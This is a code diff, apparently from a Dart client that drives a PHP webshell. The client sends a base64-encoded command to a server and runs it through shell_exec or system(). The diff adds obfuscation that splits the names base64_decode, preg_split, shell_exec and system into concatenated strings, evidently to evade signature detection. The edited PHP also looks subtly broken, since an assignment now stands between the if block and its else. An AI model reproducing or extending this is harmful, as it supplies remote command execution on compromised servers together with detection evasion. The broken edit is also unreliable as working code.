@@ -195,10 +195,13 @@ echo encrypt(json_encode(\$result));
     // 与 php_eval 同款修正：只在 shell_exec 被禁用时才走 system()，
     // 避免静默命令因 shell_exec 返回 null 而被执行第二次。
     final code =
-        "\$c=base64_decode('$b64');"
-        r"$df=preg_split('/[\s,]+/',(string)@ini_get('disable_functions'),-1,PREG_SPLIT_NO_EMPTY);"
-        r"if(function_exists('shell_exec')&&!in_array('shell_exec',$df,true)){echo (string)@shell_exec($c.' 2>&1');}"
-        r"else{@system($c.' 2>&1');}";
+        "\$f='base'.'64_decode';\$c=\$f('$b64');"
+        r"$d='preg'.'_split';"
+        r"$df=$d('/[\s,]+/',(string)@ini_get('disable_functions'),-1,PREG_SPLIT_NO_EMPTY);"
+        r"$s='shell'.'_exec';"
+        r"if(function_exists($s)&&!in_array($s,$df,true)){echo (string)@$s($c.' 2>&1');}"
+        r"$y='sys'.'tem';"
+        r"else{@$y($c.' 2>&1');}";
     final r = await _sendPhp(code);
     return r.trim();
   }
